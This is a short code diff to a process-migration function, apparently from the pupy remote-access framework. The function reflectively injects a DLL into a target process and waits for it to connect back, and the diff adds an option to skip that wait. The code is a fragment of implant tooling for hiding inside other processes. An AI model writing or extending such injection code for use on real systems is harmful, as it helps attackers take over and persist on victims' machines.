@@ -8,7 +8,7 @@ def has_proc_migrated(client, pid):
 				return c
 	return None
 
-def migrate(module, pid):
+def migrate(module, pid, keep=False):
 	module.client.load_package("psutil")
 	module.client.load_package("pupwinutils.processes")
 	dllbuf=b""
@@ -28,6 +28,8 @@ def migrate(module, pid):
 	module.success("injecting DLL in target process %s ..."%pid)
 	module.client.conn.modules['pupy'].reflective_inject_dll(pid, dllbuff, isProcess64bits)
 	module.success("DLL injected !")
+	if keep:
+		return
 	module.success("waiting for a connection from the DLL ...")
 	while True:
 		c=has_proc_migrated(module.client, pid)
